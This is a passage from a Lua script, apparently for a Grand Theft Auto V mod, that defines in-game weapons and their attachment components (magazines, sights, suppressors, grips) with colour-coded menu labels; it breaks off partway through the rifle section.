                        name = "~h~~r~> ~s~Compensator", id = "COMPONENT_AT_PI_COMP"
                    }, {
                        name = "~h~~r~> ~s~Suppessor", id = "COMPONENT_AT_PI_SUPP_02"
                    }
                }
            }
        }, CombatPistol = {
            id = "weapon_combatpistol", name = "~h~Combat Pistol", bInfAmmo = false, mods = {
                Magazines = {
                    {
                        name = "~h~~r~> ~s~Default Magazine", id = "COMPONENT_COMBATPISTOL_CLIP_01"
                    }, {
                        name = "~h~~r~> ~s~Extended Magazine", id = "COMPONENT_COMBATPISTOL_CLIP_02"
                    }
                }, Flashlight = {
                    {
                        name = "~h~~r~> ~s~Flashlight", id = "COMPONENT_AT_PI_FLSH"
                    }
                }, BarrelAttachments = {
                    {
                        name = "~h~~r~> ~s~Suppressor", id = "COMPONENT_AT_PI_SUPP"
                    }
                }
            }
        }, APPistol = {
            id = "weapon_appistol", name = "AP Pistol", bInfAmmo = false, mods = {
                Magazines = {
                    {
                        name = "~h~~r~> ~s~Default Magazine", id = "COMPONENT_APPISTOL_CLIP_01"
                    }, {
                        name = "~h~~r~> ~s~Extended Magazine", id = "COMPONENT_APPISTOL_CLIP_02"
                    }
                }, Flashlight = {
                    {
                        name = "~h~~r~> ~s~Flashlight", id = "COMPONENT_AT_PI_FLSH"
                    }
                }, BarrelAttachments = {
                    {
                        name = "~h~~r~> ~s~Suppressor", id = "COMPONENT_AT_PI_SUPP"
                    }
                }
            }
        }, StunGun = {
            id = "weapon_stungun", name = "~h~~r~> ~s~Stun Gun", bInfAmmo = false, mods = {}
        }, Pistol50 = {
            id = "weapon_pistol50", name = "~h~~r~> ~s~Pistol .50", bInfAmmo = false, mods = {
                Magazines = {
                    {
                        name = "~h~~r~> ~s~Default Magazine", id = "COMPONENT_PISTOL50_CLIP_01"
                    }, {
                        name = "~h~~r~> ~s~Extended Magazine", id = "COMPONENT_PISTOL50_CLIP_02"
                    }
                }, Flashlight = {
                    {
                        name = "~h~~r~> ~s~Flashlight", id = "COMPONENT_AT_PI_FLSH"
                    }
                }, BarrelAttachments = {
                    {
                        name = "~h~~r~> ~s~Suppressor", id = "COMPONENT_AT_PI_SUPP_02"
                    }
                }
            }
        }, SNSPistol = {
            id = "weapon_snspistol", name = "~h~~r~> ~s~SNS Pistol", bInfAmmo = false, mods = {
                Magazines = {
                    {
                        name = "~h~~r~> ~s~Default Magazine", id = "COMPONENT_SNSPISTOL_CLIP_01"
                    }, {
                        name = "~h~~r~> ~s~Extended Magazine", id = "COMPONENT_SNSPISTOL_CLIP_02"
                    }
                }
            }
        }, SNSPistolMkII = {
            id = "weapon_snspistol_mk2", name = "~h~~r~> ~s~SNS Pistol Mk II", bInfAmmo = false, mods = {
                Magazines = {
                    {
                        name = "~h~~r~> ~s~Default Magazine", id = "COMPONENT_SNSPISTOL_MK2_CLIP_01"
                    }, {
                        name = "~h~~r~> ~s~Extended Magazine", id = "COMPONENT_SNSPISTOL_MK2_CLIP_02"
                    }, {
                        name = "~h~~r~> ~s~Tracer Rounds", id = "COMPONENT_SNSPISTOL_MK2_CLIP_TRACER"
                    }, {
                        name = "~h~~r~> ~s~Incendiary Rounds", id = "COMPONENT_SNSPISTOL_MK2_CLIP_INCENDIARY"
                    }, {
                        name = "~h~~r~> ~s~Hollow Point Rounds", id = "COMPONENT_SNSPISTOL_MK2_CLIP_HOLLOWPOINT"
                    }, {
                        name = "~h~~r~> ~s~FMJ Rounds", id = "COMPONENT_SNSPISTOL_MK2_CLIP_FMJ"
                    }
                }, Sights = {
                    {
                        name = "~h~~r~> ~s~Mounted Scope", id = "COMPONENT_AT_PI_RAIL_02"
                    }
                }, Flashlight = {
                    {
                        name = "~h~~r~> ~s~Flashlight", id = "COMPONENT_AT_PI_FLSH_03"
                    }
                }, BarrelAttachments = {
                    {
                        name = "~h~~r~> ~s~Compensator", id = "COMPONENT_AT_PI_COMP_02"
                    }, {
                        name = "~h~~r~> ~s~Suppressor", id = "COMPONENT_AT_PI_SUPP_02"
                    }
                }
            }
        }, HeavyPistol = {
            id = "weapon_heavypistol", name = "~h~~r~> ~s~Heavy Pistol", bInfAmmo = false, mods = {
                Magazines = {
                    {
                        name = "~h~~r~> ~s~Default Magazine", id = "COMPONENT_HEAVYPISTOL_CLIP_01"
                    }, {
                        name = "~h~~r~> ~s~Extended Magazine", id = "COMPONENT_HEAVYPISTOL_CLIP_02"
                    }
                }, Flashlight = {
                    {
                        name = "~h~~r~> ~s~Flashlight", id = "COMPONENT_AT_PI_FLSH"
                    }
                }, BarrelAttachments = {
                    {
                        name = "~h~~r~> ~s~Suppressor", id = "COMPONENT_AT_PI_SUPP"
                    }
                }
            }
        }, VintagePistol = {
            id = "weapon_vintagepistol", name = "~h~~r~> ~s~Vintage Pistol", bInfAmmo = false, mods = {
                Magazines = {
                    {
                        name = "~h~~r~> ~s~Default Magazine", id = "COMPONENT_VINTAGEPISTOL_CLIP_01"
                    }, {
                        name = "~h~~r~> ~s~Extended Magazine", id = "COMPONENT_VINTAGEPISTOL_CLIP_02"
                    }
                }, BarrelAttachments = {
                    {
                        "Suppressor", id = "COMPONENT_AT_PI_SUPP"
                    }
                }
            }
        }, FlareGun = {
            id = "weapon_flaregun", name = "~h~~r~> ~s~Flare Gun", bInfAmmo = false, mods = {}
        }, MarksmanPistol = {
            id = "weapon_marksmanpistol", name = "~h~~r~> ~s~Marksman Pistol", bInfAmmo = false, mods = {}
        }, HeavyRevolver = {
            id = "weapon_revolver", name = "~h~~r~> ~s~Heavy Revolver", bInfAmmo = false, mods = {}
        }, HeavyRevolverMkII = {
            id = "weapon_revolver_mk2", name = "~h~~r~> ~s~Heavy Revolver Mk II", bInfAmmo = false, mods = {
                Magazines = {
                    {
                        name = "~h~~r~> ~s~Default Rounds", id = "COMPONENT_REVOLVER_MK2_CLIP_01"
                    }, {
                        name = "~h~~r~> ~s~Tracer Rounds", id = "COMPONENT_REVOLVER_MK2_CLIP_TRACER"
                    }, {
                        name = "~h~~r~> ~s~Incendiary Rounds", id = "COMPONENT_REVOLVER_MK2_CLIP_INCENDIARY"
                    }, {
                        name = "~h~~r~> ~s~Hollow Point Rounds", id = "COMPONENT_REVOLVER_MK2_CLIP_HOLLOWPOINT"
                    }, {
                        name = "~h~~r~> ~s~FMJ Rounds", id = "COMPONENT_REVOLVER_MK2_CLIP_FMJ"
                    }
                }, Sights = {
                    {
                        name = "~h~~r~> ~s~Holograhpic Sight", id = "COMPONENT_AT_SIGHTS"
                    }, {
                        name = "~h~~r~> ~s~Small Scope", id = "COMPONENT_AT_SCOPE_MACRO_MK2"
                    }
                }, Flashlight = {
                    {
                        name = "~h~~r~> ~s~Flashlight", id = "COMPONENT_AT_PI_FLSH"
                    }
                }, BarrelAttachments = {
                    {
                        name = "~h~~r~> ~s~Compensator", id = "COMPONENT_AT_PI_COMP_03"
                    }
                }
            }
        }, DoubleActionRevolver = {
            id = "weapon_doubleaction", name = "~h~~r~> ~s~Double Action Revolver", bInfAmmo = false, mods = {}
        }, UpnAtomizer = {
            id = "weapon_raypistol", name = "~h~~r~> ~s~Up-n-Atomizer", bInfAmmo = false, mods = {}
        }
    }, SMG = {
        MicroSMG = {
            id = "weapon_microsmg", name = "~h~~r~> ~s~Micro SMG", bInfAmmo = false, mods = {
                Magazines = {
                    {
                        name = "~h~~r~> ~s~Default Magazine", id = "COMPONENT_MICROSMG_CLIP_01"
                    }, {
                        name = "~h~~r~> ~s~Extended Magazine", id = "COMPONENT_MICROSMG_CLIP_02"
                    }
                }, Sights = {
                    {
                        name = "~h~~r~> ~s~Scope", id = "COMPONENT_AT_SCOPE_MACRO"
                    }
                }, Flashlight = {
                    {
                        name = "~h~~r~> ~s~Flashlight", id = "COMPONENT_AT_PI_FLSH"
                    }
                }, BarrelAttachments = {
                    {
                        name = "~h~~r~> ~s~Suppressor", id = "COMPONENT_AT_AR_SUPP_02"
                    }
                }
            }
        }, SMG = {
            id = "weapon_smg", name = "~h~~r~> ~s~SMG", bInfAmmo = false, mods = {
                Magazines = {
                    {
                        name = "~h~~r~> ~s~Default Magazine", id = "COMPONENT_SMG_CLIP_01"
                    }, {
                        name = "~h~~r~> ~s~Extended Magazine", id = "COMPONENT_SMG_CLIP_02"
                    }, {
                        name = "~h~~r~> ~s~Drum Magazine", id = "COMPONENT_SMG_CLIP_03"
                    }
                }, Sights = {
                    {
                        name = "~h~~r~> ~s~Scope", id = "COMPONENT_AT_SCOPE_MACRO_02"
                    }
                }, Flashlight = {
                    {
                        name = "~h~~r~> ~s~Flashlight", id = "COMPONENT_AT_AR_FLSH"
                    }
                }, BarrelAttachments = {
                    {
                        name = "~h~~r~> ~s~Suppressor", id = "COMPONENT_AT_PI_SUPP"
                    }
                }
            }
        }, SMGMkII = {
            id = "weapon_smg_mk2", name = "~h~~r~> ~s~SMG Mk II", bInfAmmo = false, mods = {
                Magazines = {
                    {
                        name = "~h~~r~> ~s~Default Magazine", id = "COMPONENT_SMG_MK2_CLIP_01"
                    }, {
                        name = "~h~~r~> ~s~Extended Magazine", id = "COMPONENT_SMG_MK2_CLIP_02"
                    }, {
                        name = "~h~~r~> ~s~Tracer Rounds", id = "COMPONENT_SMG_MK2_CLIP_TRACER"
                    }, {
                        name = "~h~~r~> ~s~Incendiary Rounds", id = "COMPONENT_SMG_MK2_CLIP_INCENDIARY"
                    }, {
                        name = "~h~~r~> ~s~Hollow Point Rounds", id = "COMPONENT_SMG_MK2_CLIP_HOLLOWPOINT"
                    }, {
                        name = "~h~~r~> ~s~FMJ Rounds", id = "COMPONENT_SMG_MK2_CLIP_FMJ"
                    }
                }, Sights = {
                    {
                        name = "~h~~r~> ~s~Holograhpic Sight", id = "COMPONENT_AT_SIGHTS_SMG"
                    }, {
                        name = "~h~~r~> ~s~Small Scope", id = "COMPONENT_AT_SCOPE_MACRO_02_SMG_MK2"
                    }, {
                        name = "~h~~r~> ~s~Medium Scope", id = "COMPONENT_AT_SCOPE_SMALL_SMG_MK2"
                    }
                }, Flashlight = {
                    {
                        name = "~h~~r~> ~s~Flashlight", id = "COMPONENT_AT_AR_FLSH"
                    }
                }, Barrel = {
                    {
                        name = "~h~~r~> ~s~Default", id = "COMPONENT_AT_SB_BARREL_01"
                    }, {
                        name = "~h~~r~> ~s~Heavy", id = "COMPONENT_AT_SB_BARREL_02"
                    }
                }, BarrelAttachments = {
                    {
                        name = "~h~~r~> ~s~Suppressor", id = "COMPONENT_AT_PI_SUPP"
                    }, {
                        name = "~h~~r~> ~s~Flat Muzzle Brake", id = "COMPONENT_AT_MUZZLE_01"
                    }, {
                        name = "~h~~r~> ~s~Tactical Muzzle Brake", id = "COMPONENT_AT_MUZZLE_02"
                    }, {
                        name = "~h~~r~> ~s~Fat-End Muzzle Brake", id = "COMPONENT_AT_MUZZLE_03"
                    }, {
                        name = "~h~~r~> ~s~Precision Muzzle Brake", id = "COMPONENT_AT_MUZZLE_04"
                    }, {
                        name = "~h~~r~> ~s~Heavy Duty Muzzle Brake", id = "COMPONENT_AT_MUZZLE_05"
                    }, {
                        name = "~h~~r~> ~s~Slanted Muzzle Brake", id = "COMPONENT_AT_MUZZLE_06"
                    }, {
                        name = "~h~~r~> ~s~Split-End Muzzle Brake", id = "COMPONENT_AT_MUZZLE_07"
                    }
                }
            }
        }, AssaultSMG = {
            id = "weapon_assaultsmg", name = "~h~~r~> ~s~Assault SMG", bInfAmmo = false, mods = {
                Magazines = {
                    {
                        name = "~h~~r~> ~s~Default Magazine", id = "COMPONENT_ASSAULTSMG_CLIP_01"
                    }, {
                        name = "~h~~r~> ~s~Extended Magazine", id = "COMPONENT_ASSAULTSMG_CLIP_02"
                    }
                }, Sights = {
                    {
                        name = "~h~~r~> ~s~Scope", id = "COMPONENT_AT_SCOPE_MACRO"
                    }
                }, Flashlight = {
                    {
                        name = "~h~~r~> ~s~Flashlight", id = "COMPONENT_AT_AR_FLSH"
                    }
                }, BarrelAttachments = {
                    {
                        name = "~h~~r~> ~s~Suppressor", id = "COMPONENT_AT_AR_SUPP_02"
                    }
                }
            }
        }, CombatPDW = {
            id = "weapon_combatpdw", name = "~h~~r~> ~s~Combat PDW", bInfAmmo = false, mods = {
                Magazines = {
                    {
                        name = "~h~~r~> ~s~Default Magazine", id = "COMPONENT_COMBATPDW_CLIP_01"
                    }, {
                        name = "~h~~r~> ~s~Extended Magazine", id = "COMPONENT_COMBATPDW_CLIP_02"
                    }, {
                        name = "~h~~r~> ~s~Drum Magazine", id = "COMPONENT_COMBATPDW_CLIP_03"
                    }
                }, Sights = {
                    {
                        name = "~h~~r~> ~s~Scope", id = "COMPONENT_AT_SCOPE_SMALL"
                    }
                }, Flashlight = {
                    {
                        name = "~h~~r~> ~s~Flashlight", id = "COMPONENT_AT_AR_FLSH"
                    }
                }, Grips = {
                    {
                        name = "~h~~r~> ~s~Grip", id = "COMPONENT_AT_AR_AFGRIP"
                    }
                }
            }
        }, MachinePistol = {
            id = "weapon_machinepistol", name = "~h~~r~> ~s~Machine Pistol ", bInfAmmo = false, mods = {
                Magazines = {
                    {
                        name = "~h~~r~> ~s~Default Magazine", id = "COMPONENT_MACHINEPISTOL_CLIP_01"
                    }, {
                        name = "~h~~r~> ~s~Extended Magazine", id = "COMPONENT_MACHINEPISTOL_CLIP_02"
                    }, {
                        name = "~h~~r~> ~s~Drum Magazine", id = "COMPONENT_MACHINEPISTOL_CLIP_03"
                    }
                }, BarrelAttachments = {
                    {
                        name = "~h~~r~> ~s~Suppressor", id = "COMPONENT_AT_PI_SUPP"
                    }
                }
            }
        }, MiniSMG = {
            id = "weapon_minismg", name = "~h~~r~> ~s~Mini SMG", bInfAmmo = false, mods = {
                Magazines = {
                    {
                        name = "~h~~r~> ~s~Default Magazine", id = "COMPONENT_MINISMG_CLIP_01"
                    }, {
                        name = "~h~~r~> ~s~Extended Magazine", id = "COMPONENT_MINISMG_CLIP_02"
                    }
                }
            }
        }, UnholyHellbringer = {
            id = "weapon_raycarbine", name = "~h~~r~> ~s~Unholy Hellbringer", bInfAmmo = false, mods = {}
        }
    }, Shotguns = {
        PumpShotgun = {
            id = "weapon_pumpshotgun", name = "~h~~r~> ~s~Pump Shotgun", bInfAmmo = false, mods = {
                Flashlight = {
                    {
                        "name = Flashlight", id = "COMPONENT_AT_AR_FLSH"
                    }
                }, BarrelAttachments = {
                    {
                        name = "~h~~r~> ~s~Suppressor", id = "COMPONENT_AT_SR_SUPP"
                    }
                }
            }
        }, PumpShotgunMkII = {
            id = "weapon_pumpshotgun_mk2", name = "~h~~r~> ~s~Pump Shotgun Mk II", bInfAmmo = false, mods = {
                Magazines = {
                    {
                        name = "~h~~r~> ~s~Default Shells", id = "COMPONENT_PUMPSHOTGUN_MK2_CLIP_01"
                    }, {
                        name = "~h~~r~> ~s~Dragon Breath Shells", id = "COMPONENT_PUMPSHOTGUN_MK2_CLIP_INCENDIARY"
                    }, {
                        name = "~h~~r~> ~s~Steel Buckshot Shells", id = "COMPONENT_PUMPSHOTGUN_MK2_CLIP_ARMORPIERCING"
                    }, {
                        name = "~h~~r~> ~s~Flechette Shells", id = "COMPONENT_PUMPSHOTGUN_MK2_CLIP_HOLLOWPOINT"
                    }, {
                        name = "~h~~r~> ~s~Explosive Slugs", id = "COMPONENT_PUMPSHOTGUN_MK2_CLIP_EXPLOSIVE"
                    }
                }, Sights = {
                    {
                        name = "~h~~r~> ~s~Holograhpic Sight", id = "COMPONENT_AT_SIGHTS"
                    }, {
                        name = "~h~~r~> ~s~Small Scope", id = "COMPONENT_AT_SCOPE_MACRO_MK2"
                    }, {
                        name = "~h~~r~> ~s~Medium Scope", id = "COMPONENT_AT_SCOPE_SMALL_MK2"
                    }
                }, Flashlight = {
                    {
                        name = "~h~~r~> ~s~Flashlight", id = "COMPONENT_AT_AR_FLSH"
                    }
                }, BarrelAttachments = {
                    {
                        name = "~h~~r~> ~s~Suppressor", id = "COMPONENT_AT_SR_SUPP_03"
                    }, {
                        name = "~h~~r~> ~s~Squared Muzzle Brake", id = "COMPONENT_AT_MUZZLE_08"
                    }
                }
            }
        }, SawedOffShotgun = {
            id = "weapon_sawnoffshotgun", name = "~h~~r~> ~s~Sawed-Off Shotgun", bInfAmmo = false, mods = {}
        }, AssaultShotgun = {
            id = "weapon_assaultshotgun", name = "~h~~r~> ~s~Assault Shotgun", bInfAmmo = false, mods = {
                Magazines = {
                    {
                        name = "~h~~r~> ~s~Default Magazine", id = "COMPONENT_ASSAULTSHOTGUN_CLIP_01"
                    }, {
                        name = "~h~~r~> ~s~Extended Magazine", id = "COMPONENT_ASSAULTSHOTGUN_CLIP_02"
                    }
                }, Flashlight = {
                    {
                        name = "~h~~r~> ~s~Flashlight", id = "COMPONENT_AT_AR_FLSH"
                    }
                }, BarrelAttachments = {
                    {
                        name = "~h~~r~> ~s~Suppressor", id = "COMPONENT_AT_AR_SUPP"
                    }
                }, Grips = {
                    {
                        name = "~h~~r~> ~s~Grip", id = "COMPONENT_AT_AR_AFGRIP"
                    }
                }
            }
        }, BullpupShotgun = {
            id = "weapon_bullpupshotgun", name = "~h~~r~> ~s~Bullpup Shotgun", bInfAmmo = false, mods = {
                Flashlight = {
                    {
                        name = "~h~~r~> ~s~Flashlight", id = "COMPONENT_AT_AR_FLSH"
                    }
                }, BarrelAttachments = {
                    {
                        name = "~h~~r~> ~s~Suppressor", id = "COMPONENT_AT_AR_SUPP_02"
                    }
                }, Grips = {
                    {
                        name = "~h~~r~> ~s~Grip", id = "COMPONENT_AT_AR_AFGRIP"
                    }
                }
            }
        }, Musket = {
            id = "weapon_musket", name = "~h~~r~> ~s~Musket", bInfAmmo = false, mods = {}
        }, HeavyShotgun = {
            id = "weapon_heavyshotgun", name = "~h~~r~> ~s~Heavy Shotgun", bInfAmmo = false, mods = {
                Magazines = {
                    {
                        name = "~h~~r~> ~s~Default Magazine", id = "COMPONENT_HEAVYSHOTGUN_CLIP_01"
                    }, {
                        name = "~h~~r~> ~s~Extended Magazine", id = "COMPONENT_HEAVYSHOTGUN_CLIP_02"
                    }, {
                        name = "~h~~r~> ~s~Drum Magazine", id = "COMPONENT_HEAVYSHOTGUN_CLIP_02"
                    }
                }, Flashlight = {
                    {
                        name = "~h~~r~> ~s~Flashlight", id = "COMPONENT_AT_AR_FLSH"
                    }
                }, BarrelAttachments = {
                    {
                        name = "~h~~r~> ~s~Suppressor", id = "COMPONENT_AT_AR_SUPP_02"
                    }
                }, Grips = {
                    {
                        name = "~h~~r~> ~s~Grip", id = "COMPONENT_AT_AR_AFGRIP"
                    }
                }
            }
        }, DoubleBarrelShotgun = {
            id = "weapon_dbshotgun", name = "~h~~r~> ~s~Double Barrel Shotgun", bInfAmmo = false, mods = {}
        }, SweeperShotgun = {
            id = "weapon_autoshotgun", name = "~h~~r~> ~s~Sweeper Shotgun", bInfAmmo = false, mods = {}
        }
    }, AssaultRifles = {
        AssaultRifle = {
            id = "weapon_assaultrifle", name = "~h~~r~> ~s~Assault Rifle", bInfAmmo = false, mods = {
                Magazines = {
                    {
                        name = "~h~~r~> ~s~Default Magazine", id = "COMPONENT_ASSAULTRIFLE_CLIP_01"
                    }, {
                        name = "~h~~r~> ~s~Extended Magazine", id = "COMPONENT_ASSAULTRIFLE_CLIP_02"
                    }, {
                        name = "~h~~r~> ~s~Drum Magazine", id = "COMPONENT_ASSAULTRIFLE_CLIP_03"
                    }
                }, Sights = {
                    {
                        name = "~h~~r~> ~s~Scope", id = "COMPONENT_AT_SCOPE_MACRO"
                    }
                }, Flashlight = {
                    {
                        name = "~h~~r~> ~s~Flashlight", id = "COMPONENT_AT_AR_FLSH"
                    }
                }, BarrelAttachments = {
                    {
                        name = "~h~~r~> ~s~Suppressor", id = "COMPONENT_AT_AR_SUPP_02"
                    }
                }, Grips = {
                    {
                        name = "~h~~r~> ~s~Grip", id = "COMPONENT_AT_AR_AFGRIP"
                    }
                }
            }
        }, AssaultRifleMkII = {
            id = "weapon_assaultrifle_mk2", name = "~h~~r~> ~s~Assault Rifle Mk II", bInfAmmo = false, mods = {
                Magazines = {
                    {
                        name = "~h~~r~> ~s~Default Magazine", id = "COMPONENT_ASSAULTRIFLE_MK2_CLIP_01"
                    }, {
                        name = "~h~~r~> ~s~Extended Magazine", id = "COMPONENT_ASSAULTRIFLE_MK2_CLIP_02"
                    }, {
                        name = "~h~~r~> ~s~Tracer Rounds", id = "COMPONENT_ASSAULTRIFLE_MK2_CLIP_TRACER"
                    }, {
                        name = "~h~~r~> ~s~Incendiary Rounds", id = "COMPONENT_ASSAULTRIFLE_MK2_CLIP_INCENDIARY"
                    }, {
                        name = "~h~~r~> ~s~Hollow Point Rounds", id = "COMPONENT_ASSAULTRIFLE_MK2_CLIP_ARMORPIERCING"
                    }, {
                        name = "~h~~r~> ~s~FMJ Rounds", id = "COMPONENT_ASSAULTRIFLE_MK2_CLIP_FMJ"
                    }
                }, Sights = {
                    {
                        name = "~h~~r~> ~s~Holograhpic Sight", id = "COMPONENT_AT_SIGHTS"
                    }, {
                        name = "~h~~r~> ~s~Small Scope", id = "COMPONENT_AT_SCOPE_MACRO_MK2"
                    }, {
                        name = "~h~~r~> ~s~Large Scope", id = "COMPONENT_AT_SCOPE_MEDIUM_MK2"
                    }
                }, Flashlight = {
                    {
                        name = "~h~~r~> ~s~Flashlight", id = "COMPONENT_AT_AR_FLSH"
                    }
                }, Barrel = {
                    {
                        name = "~h~~r~> ~s~Default", id = "COMPONENT_AT_AR_BARREL_01"
                    }, {
                        name = "~h~~r~> ~s~Heavy", id = "COMPONENT_AT_AR_BARREL_0"
                    }
                }, BarrelAttachments = {
                    {
                        name = "~h~~r~> ~s~Suppressor", id = "COMPONENT_AT_AR_SUPP_02"
                    }, {
                        name = "~h~~r~> ~s~Flat Muzzle Brake", id = "COMPONENT_AT_MUZZLE_01"
                    }, {
                        name = "~h~~r~> ~s~Tactical Muzzle Brake", id = "COMPONENT_AT_MUZZLE_02"
                    }, {
                        name = "~h~~r~> ~s~Fat-End Muzzle Brake", id = "COMPONENT_AT_MUZZLE_03"
                    }, {
                        name = "~h~~r~> ~s~Precision Muzzle Brake", id = "COMPONENT_AT_MUZZLE_04"
                    }, {
                        name = "~h~~r~> ~s~Heavy Duty Muzzle Brake", id = "COMPONENT_AT_MUZZLE_05"
                    }, {
                        name = "~h~~r~> ~s~Slanted Muzzle Brake", id = "COMPONENT_AT_MUZZLE_06"
                    }, {
                        name = "~h~~r~> ~s~Split-End Muzzle Brake", id = "COMPONENT_AT_MUZZLE_07"
                    }
                }, Grips = {
                    {
                        name = "~h~~r~> ~s~Grip", id = "COMPONENT_AT_AR_AFGRIP_02"
                    }
                }
            }
        }, CarbineRifle = {
            id = "weapon_carbinerifle", name = "~h~~r~> ~s~Carbine Rifle", bInfAmmo = false, mods = {
                Magazines = {
                    {
                        name = "~h~~r~> ~s~Default Magazine", id = "COMPONENT_CARBINERIFLE_CLIP_01"
                    }, {
                        name = "~h~~r~> ~s~Extended Magazine", id = "COMPONENT_CARBINERIFLE_CLIP_02"
                    }, {
                        name = "~h~~r~> ~s~Box Magazine", id = "COMPONENT_CARBINERIFLE_CLIP_03"
                    }
                }, Sights = {
                    {
                        name = "~h~~r~> ~s~Scope", id = "COMPONENT_AT_SCOPE_MEDIUM"
                    }
                }, Flashlight = {
                    {
                        name = "~h~~r~> ~s~Flashlight", id = "COMPONENT_AT_AR_FLSH"
                    }
                }, BarrelAttachments = {
                    {
                        name = "~h~~r~> ~s~Suppressor", id = "COMPONENT_AT_AR_SUPP"
                    }
                }, Grips = {
                    {
                        name = "~h~~r~> ~s~Grip", id = "COMPONENT_AT_AR_AFGRIP"
                    }
                }
            }
        }, CarbineRifleMkII = {
            id = "weapon_carbinerifle_mk2", name = "~h~~r~> ~s~Carbine Rifle Mk II ", bInfAmmo = false, mods = {
                Magazines = {
                    {
                        name = "~h~~r~> ~s~Default Magazine", id = "COMPONENT_CARBINERIFLE_MK2_CLIP_01"
                    }, {
                        name = "~h~~r~> ~s~Extended Magazine", id = "COMPONENT_CARBINERIFLE_MK2_CLIP_02"
                    }, {
                        name = "~h~~r~> ~s~Tracer Rounds", id = "COMPONENT_CARBINERIFLE_MK2_CLIP_TRACER"
                    }, {
                        name = "~h~~r~> ~s~Incendiary Rounds", id = "COMPONENT_CARBINERIFLE_MK2_CLIP_INCENDIARY"
                    }, {
                        name = "~h~~r~> ~s~Hollow Point Rounds", id = "COMPONENT_CARBINERIFLE_MK2_CLIP_ARMORPIERCING"
                    }, {
                        name = "~h~~r~> ~s~FMJ Rounds", id = "COMPONENT_CARBINERIFLE_MK2_CLIP_FMJ"
                    }
                }, Sights = {
                    {
                        name = "~h~~r~> ~s~Holograhpic Sight", id = "COMPONENT_AT_SIGHTS"
                    }, {
                        name = "~h~~r~> ~s~Small Scope", id = "COMPONENT_AT_SCOPE_MACRO_MK2"
                    }, {
                        name = "~h~~r~> ~s~Large Scope", id = "COMPONENT_AT_SCOPE_MEDIUM_MK2"
                    }
                }, Flashlight = {
                    {
                        name = "~h~~r~> ~s~Flashlight", id = "COMPONENT_AT_AR_FLSH"
                    }
                }, Barrel = {
                    {
                        name = "~h~~r~> ~s~Default", id = "COMPONENT_AT_CR_BARREL_01"
                    }, {
                        name = "~h~~r~> ~s~Heavy", id = "COMPONENT_AT_CR_BARREL_02"
                    }
                }, BarrelAttachments = {
                    {
                        name = "~h~~r~> ~s~Suppressor", id = "COMPONENT_AT_AR_SUPP"
                    }, {
                        name = "~h~~r~> ~s~Flat Muzzle Brake", id = "COMPONENT_AT_MUZZLE_01"
                    }, {
                        name = "~h~~r~> ~s~Tactical Muzzle Brake", id = "COMPONENT_AT_MUZZLE_02"
                    }, {
                        name = "~h~~r~> ~s~Fat-End Muzzle Brake", id = "COMPONENT_AT_MUZZLE_03"
                    }, {
                        name = "~h~~r~> ~s~Precision Muzzle Brake", id = "COMPONENT_AT_MUZZLE_04"
                    }, {
                        name = "~h~~r~> ~s~Heavy Duty Muzzle Brake", id = "COMPONENT_AT_MUZZLE_05"
                    }, {
                        name = "~h~~r~> ~s~Slanted Muzzle Brake", id = "COMPONENT_AT_MUZZLE_06"
                    }, {
                        name = "~h~~r~> ~s~Split-End Muzzle Brake", id = "COMPONENT_AT_MUZZLE_07"
                    }
                }, Grips = {
                    {
                        name = "~h~~r~> ~s~Grip", id = "COMPONENT_AT_AR_AFGRIP_02"
                    }
                }
            }
        }, AdvancedRifle = {
            id = "weapon_advancedrifle", name = "~h~~r~> ~s~Advanced Rifle ", bInfAmmo = false, mods = {
                Magazines = {
                    {
                        name = "~h~~r~> ~s~Default Magazine", id = "COMPONENT_ADVANCEDRIFLE_CLIP_01"
                    }, {
                        name = "~h~~r~> ~s~Extended Magazine", id = "COMPONENT_ADVANCEDRIFLE_CLIP_02"
                    }
                }, Sights = {
                    {
                        name = "~h~~r~> ~s~Scope", id = "COMPONENT_AT_SCOPE_SMALL"
                    }
                }, Flashlight = {
                    {
                        name = "~h~~r~> ~s~Flashlight", id = "COMPONENT_AT_AR_FLSH"
                    }
                }, BarrelAttachments = {
                    {
                        name = "~h~~r~> ~s~Suppressor", id = "COMPONENT_AT_AR_SUPP"
                    }
                }
            }
        }, SpecialCarbine = {
            id = "weapon_specialcarbine", name = "~h~~r~> ~s~Special Carbine", bInfAmmo = false, mods = {
                Magazines = {
                    {
                        name = "~h~~r~> ~s~Default Magazine", id = "COMPONENT_SPECIALCARBINE_CLIP_01"
                    }, {
                        name = "~h~~r~> ~s~Extended Magazine", id = "COMPONENT_SPECIALCARBINE_CLIP_02"
                    }, {
                        name = "~h~~r~> ~s~Drum Magazine", id = "COMPONENT_SPECIALCARBINE_CLIP_03"
                    }
                }, Sights = {
                    {
                        name = "~h~~r~> ~s~Scope", id = "COMPONENT_AT_SCOPE_MEDIUM"
                    }
                }, Flashlight = {
                    {
                        name = "~h~~r~> ~s~Flashlight", id = "COMPONENT_AT_AR_FLSH"
                    }
                }, BarrelAttachments = {
                    {
                        name = "~h~~r~> ~s~Suppressor", id = "COMPONENT_AT_AR_SUPP_02"
                    }
                }, Grips = {
                    {
                        name = "~h~~r~> ~s~Grip", id = "COMPONENT_AT_AR_AFGRIP"
                    }
                }
            }
        }, SpecialCarbineMkII = {
            id = "weapon_specialcarbine_mk2", name = "~h~~r~> ~s~Special Carbine Mk II", bInfAmmo = false, mods = {
                Magazines = {
                    {
                        name = "~h~~r~> ~s~Default Magazine", id = "COMPONENT_SPECIALCARBINE_MK2_CLIP_01"
                    }, {
                        name = "~h~~r~> ~s~Extended Magazine", id = "COMPONENT_SPECIALCARBINE_MK2_CLIP_02"
                    }, {
                        name = "~h~~r~> ~s~Tracer Rounds", id = "COMPONENT_SPECIALCARBINE_MK2_CLIP_TRACER"
                    }, {
                        name = "~h~~r~> ~s~Incendiary Rounds", id = "COMPONENT_SPECIALCARBINE_MK2_CLIP_INCENDIARY"
                    }, {
                        name = "~h~~r~> ~s~Hollow Point Rounds", id = "COMPONENT_SPECIALCARBINE_MK2_CLIP_ARMORPIERCING"
                    }, {
                        name = "~h~~r~> ~s~FMJ Rounds", id = "COMPONENT_SPECIALCARBINE_MK2_CLIP_FMJ"
                    }
                }, Sights = {
                    {
                        name = "~h~~r~> ~s~Holograhpic Sight", id = "COMPONENT_AT_SIGHTS"
                    }, {
                        name = "~h~~r~> ~s~Small Scope", id = "COMPONENT_AT_SCOPE_MACRO_MK2"
                    }, {
                        name = "~h~~r~> ~s~Large Scope", id = "COMPONENT_AT_SCOPE_MEDIUM_MK2"
                    }
                }, Flashlight = {
                    {
                        name = "~h~~r~> ~s~Flashlight", id = "COMPONENT_AT_AR_FLSH"
                    }
                }, Barrel = {
                    {
